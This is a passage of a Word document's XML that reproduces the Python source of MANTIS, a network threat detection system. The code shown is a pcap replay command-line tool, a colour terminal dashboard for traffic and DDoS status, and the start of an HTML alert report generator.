    <w:p w14:paraId="1A2305A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(self.parser.dropped_non_ipv4, self.parser.dropped_malformed))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C9D5DB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print("\n  engine detections")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C2030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 + "-" * 62)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F96EB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labels = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="411835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"z_score": "Z-Score       (volumetric flood)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B9CD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"knn": "KNN           (port scan)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B18595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"naive_bayes": "Naive Bayes   (payload)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2028E0E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"kmeans": "K-Means       (behavioural drift)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B481C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"bloom": "Bloom Filter  (reputation)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7877C27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56C178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key, label in labels.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ECFC7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hits = self.engine_hits.get(key, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44272B7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mark = "FIRED" if hits else "  -  "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBB336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[%s] %-34s %5d alerts" % (mark, label, hits))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01AF8841" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="460AE1E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self.alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A8A49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print("\n  alert timeline (first 15)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="163CE10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 + "-" * 62)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3891E14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%-7s %-12s %-9s %-6s %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F7C0D7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("t(s)", "technique", "severity", "risk", "detail"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="651CD88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a in self.alerts[:15]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EAAC40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%-7.2f %-12s %-9s %-6.1f %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="182E068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(a["t"], a["technique_id"], a["severity"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BC0F7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a["risk_score"], a["message"][:44]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A99C6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len(self.alerts) &gt; 15:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02E1C4E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 %d more alerts" % (len(self.alerts) - 15))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4CAA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 66)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A250C3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summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A529A1B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DEEEEE0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="424EE4E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parse_args(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67AFA65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 = argparse.ArgumentParser(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588C40B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prog="mantis-replay",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="179AF39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description="replay a pcap through the MANTIS detection engines")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E8086A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p.add_argument("--pcap", help="capture file to replay")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BBA75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p.add_argument("--generate", metavar="FILE",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210F7E3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help="write a synthetic attack-scenario capture and exit")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A68B9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p.add_argument("--out-json", help="write the replay report as JSON")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E93CC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p.add_argument("--quiet", action="store_true")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170A17D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p.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7940E8B1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A2BD5D9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EB7AF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main(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E556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args = parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742D29E1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03AC8F6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args.generate:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E0552C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generate_scenario(args.generate)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D4594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0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7163B363" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18E5C1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args.pcap:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="412F7CB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give --pcap FILE or --generate FILE (see --help)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D11F6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2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52AE637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os.path.isfile(args.pcap):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072BD8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no such capture:", args.pcap)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="380A622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2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01651A97" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EB9B5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 = ReplayEngine()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="558219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started = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0612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summary = engine.run(args.pcap, verbose=not args.quiet)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32F3D2D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elapsed = time.time() - started</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EEC46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summary["replay_seconds"] = round(elapsed, 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5948CA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summary["packets"]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58879FC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summary["packets_per_second"] = int(summary["packets"] / max(elapsed, 1e-9))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660A9C1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args.quiet:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="401415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replayed %d packets in %.2fs (%d pkt/s decode rate)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8A7B5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(summary["packets"], elapsed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24AB75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summary["packets_per_second"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D228B6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7970AA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args.out_json:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724FAF0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open(args.out_json, "w", encoding="utf-8") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75FA317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json.dump(summary, f, indent=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A47F28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wrote", args.out_json)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="552EFDB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0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C8B1A0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C52ED90" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74708E1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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D0908D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sys.exit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA3ED66" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D75A16" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Dashboard, SIEM and Reporting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DA7FDE4"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src/dashboard_ui/dashboard.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C4166D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>86 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9D44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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="755A4B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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="241050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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20DF1D51" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A7474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Terminal dashboard.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50AC2EC4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="788AF7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Dashboard:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06575B4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__init__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6055949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self.stats = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E31A6D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'pps': 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D96A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'mean': 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD6C04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'z_score': 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="059A7A1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'ddos_candidate': False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1249D32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'ddos_active': False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3535D44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D1EB8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self.alerts = [] # List of strings "Time - Message"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E965D1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self.max_alerts = 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797DB1B0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66169C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add_alert(self, message):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C81CC7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timestamp = time.strftime("%H:%M:%S")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A8E680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self.alerts.append(f"[{timestamp}] {message}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="743A54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len(self.alerts) &gt; self.max_alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CBFD8F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self.alerts.pop(0) # Keep logging window small</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F29BBF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="044DD4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update_stats(self, pps, mean, z_score, ddos_candidate=False,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38DE958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ddos_active=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1B6A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self.stats['pps'] = pps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD0D5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self.stats['mean'] = mean</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42AE149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self.stats['z_score'] = z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B57C75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self.stats['ddos_candidate'] = bool(ddos_candidate)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6187CF3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self.stats['ddos_active'] = bool(ddos_active)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3226478E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0193D7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refresh(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC886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AEE7D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Clears the terminal and reprints the status.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5695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Uses ANSI escape codes for colors (Green/Red).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A9390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4FDADE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Clear command for Windows vs  Linux</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7304D05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os.system('cls' if os.name == 'nt' else 'clear')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB911D1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48ED36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Colors</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F5463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GREEN = '\033[92m'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738754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RED = '\033[91m'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C63AF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YELLOW = '\033[93m'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D1027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CYAN = '\033[96m'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5157E51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RESET = '\033[0m'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FDACF4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25E0EC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Header</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DFA3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print(f"{GREEN}================================================================{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9ED3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print(f"{GREEN}     M.A.N.T.I.S.  -  Intelligent Threat Detection System      {RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E28346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print(f"{GREEN}================================================================{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37701B01" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62C8D4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Stats Panel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8546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pps = self.stats['pps']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CF8C1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z = self.stats['z_score']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E1B3568" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34DC993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 Z-score alone is only unusual traffic. DDoS status also requires</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DEFBDC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the configured absolute PPS floor and sustained observations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41508ED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sys_color = GREEN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8427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sys_status = "NORMAL"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE9FE6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self.stats['ddos_active']:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD0B16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sys_color = RED</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A32479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sys_status = "UNDER ATTACK (DDoS)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F0FB7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elif self.stats['ddos_candidate']:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EAEF7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sys_color = YELLOW</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F2C5F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sys_status = "VERIFYING TRAFFIC SPIKE"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A22F23" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33F71C5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print(f" SYSTEM STATUS : {sys_color}{sys_status}{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0732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print(f" TRAFFIC VOLUME: {ppf_formatted(pps)} packets/sec")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71299D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print(f" BASELINE MEAN : {self.stats['mean']:.2f} pps")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="648E6C3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print(f" Z-SCORE       : {sys_color}{z:.2f}{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DA37C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print(f"{GREEN}----------------------------------------------------------------{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9B6154" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FF1B3A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Alert Log</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6685C2D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print(f"{CYAN} [ ALERT LOG ] {RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3491972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self.alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506007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print(f"   (No active threats detected)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F091D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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD03A6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alert in reversed(self.alerts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5CF31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print(f" {RED}{alert}{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE7387D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="476ED98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print(f"{GREEN}================================================================{RESET}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="029C83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print(f" Press Ctrl+C to Stop.")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497E4AE1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D0B78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def ppf_formatted(pps):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1B94E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str(pps).rjust(5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="192C5529"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src/dashboard_ui/reporting.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54CBC74E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>86 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A9EB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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19AE2B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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B9582B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="667858E3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31F6F28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ReportGenerator:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C3EF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collects alerts during a run and writes a single html file at exit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CBE56E6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D18779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__init__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EAFD07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self.filename = "mantis_report.html"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DE2AF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self.alerts = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B225017" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E677B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add_alert(self, msg):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="730B850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self.alerts.append({"time": time.strftime("%H:%M:%S"), "message": msg})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFA3BC6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69D3EE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generate(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027645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self.alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6241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 nothing happened, skip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A783AD2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2175814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rows = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33ED455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a in self.alerts:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308A6F4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msg = a["message"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49DAD71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kind, css = "UNKNOWN", ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7B972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"DDoS" in msg:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F638E2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kind, css = "DDoS Attack", "tag-ddos"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29519B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elif "SCAN" in msg:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACC362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kind, css = "Port Scan", "tag-scan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47460E4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elif "PAYLOAD" in msg:</w:t>
